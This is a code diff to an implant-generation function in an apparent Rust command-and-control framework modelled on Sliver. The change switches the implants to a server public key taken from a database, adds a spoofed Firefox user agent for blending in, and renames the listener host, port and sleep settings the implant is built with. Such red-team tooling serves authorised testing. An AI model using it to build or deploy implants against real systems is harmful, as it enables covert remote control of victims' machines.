@@ -1,13 +1,15 @@
 use log::{error, info};
-use std::fs::File;
 use std::env;
-use std::io::{Error, ErrorKind, Read};
+use std::io::{Error, ErrorKind};
 use std::process::Command;
 use std::str::from_utf8;
 use url::Url;
 
 use crate::{
-    server::crypto::aesgcm,
+    server::{
+        crypto::aesgcm::{encode, generate_keypair},
+        db,
+    },
     utils::fs::{get_app_dir, read_file},
 };
 
@@ -15,6 +17,7 @@ use crate::{
 /// References:
 /// - https://github.com/BishopFox/sliver/blob/master/server/generate/binaries.go#L325
 pub fn generate(
+    db_path: String,
     name: String,
     listener_url: String,
     os: String,
@@ -30,17 +33,29 @@ pub fn generate(
     let host = parsed_url.host().unwrap();
     let port = parsed_url.port().unwrap();
 
-    // Generate key and nonce for encrypt/decrypt communications
-    let (key, nonce) = aesgcm::init().unwrap();
+    // Additional options
+    let user_agent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0";
+
+    // Use Diffie-Hellman key exchange for secure comminucation
+    let server_public_key = match db::get_keypair(db_path.to_string()) {
+        Ok((_, p)) => p,
+        Err(e) => {
+            return Err(
+                Error::new(
+                    ErrorKind::NotFound,
+                    format!("Public key not found: {:?}", e)
+                ));
+        }
+    };
 
     // Set environment variables for `config.rs` when building an implant.
-    env::set_var("LPROTO", proto.to_string());
-    env::set_var("LHOST", host.to_string());
-    env::set_var("LPORT", port.to_string());
-    env::set_var("SLEEP", sleep.to_string());
-    env::set_var("KEY", key.to_string());
-    env::set_var("NONCE", nonce.to_string());
-    env::set_var("OUT_DIR", format!("implants/src"));
+    env::set_var("HERMIT_LPROTO", proto.to_string());
+    env::set_var("HERMIT_LHOST", host.to_string());
+    env::set_var("HERMIT_LPORT", port.to_string());
+    env::set_var("HERMIT_SLEEP", sleep.to_string());
+    env::set_var("HERMIT_USER_AGENT", user_agent.to_string());
+    env::set_var("HERMIT_PUBLIC_KEY", server_public_key.to_string());
+    env::set_var("OUT_DIR", "implants/src".to_string());
 
     let outdir = format!("{}/implants/{}", get_app_dir(), name.to_string());
 
